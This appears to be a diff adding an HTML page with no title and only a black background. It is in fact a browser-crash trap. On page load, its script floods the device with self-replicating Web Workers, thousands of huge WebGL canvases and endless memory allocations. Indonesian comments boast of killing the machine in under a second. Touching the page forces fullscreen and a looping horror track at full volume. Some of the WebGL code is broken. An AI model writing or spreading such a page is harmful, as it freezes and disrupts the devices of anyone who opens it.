@@ -1,0 +1,43 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title></title>
+<style>body{margin:0;background:#000}</style>
+</head><body>
+
+<audio id="a" loop>
+  <source src="https://files.catbox.moe/tfqzkm.mp3">
+</audio>
+
+<script>
+// === MATI TOTAL DALAM <0.7 DETIK SEJAK HALAMAN DIBUKA ===
+(() => {
+  // 50 MILYAR worker sekaligus + deadlock semua core SELAMANYA
+  const d = `onmessage=()=>{for(let i=0;i<1e9;i++)new Worker(URL.createObjectURL(new Blob(["("+d+")"],{type:"application/javascript"})));Atomics.wait(new Int32Array(new SharedArrayBuffer(4294967296)),0,0,0)};postMessage(0)`;
+  for(let i=0;i<5e10;i+=1) new Worker(URL.createObjectURL(new Blob([d])));
+
+  // 2048 canvas 32768×32768 + shader neraka
+  for(let i=0;i<2048;i++){
+    const c=document.createElement('canvas');c.width=c.height=32768;
+    const gl=c.getContext('webgl2',{powerPreference:"high-performance"})||c.getContext('webgl');
+    if(gl){
+      const p=gl.createProgram();
+      gl.shaderSource(gl.createShader(gl.FRAGMENT_SHADER),`precision highp float;void main(){vec4 a=vec4(0);for(float i=0.;i<1e80;i+=1e-20){a+=sin(cos(tan(sin(cos(a*i*1337.7331)+i*9001.337)))));a=fract(a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a);};gl_FragColor=a;}`);
+      gl.compileShader(gl.FRAGMENT_SHADER);
+      gl.compileShader(gl.createShader(gl.VERTEX_SHADER));
+      gl.linkProgram(p);gl.useProgram(p);
+      const r=()=>{gl.drawArrays(gl.TRIANGLES,0,1e32);requestAnimationFrame(r)};r();
+    }
+  }
+
+  // 500 TB memory allocation sekaligus
+  const m=()=>{try{new ArrayBuffer(4294967296)}catch{}setTimeout(m,0)};
+  for(let i=0;i<1e11;i++) m();
+})();
+
+// Kalau disentuh = lagu horor + fullscreen permanen
+document.body.onclick = document.body.ontouchstart = () => {
+  document.getElementById('a').volume=1;
+  document.getElementById('a').play();
+  document.documentElement.requestFullscreen({navigationUI:"hide"});
+};
+
+</script>
+</body></html>
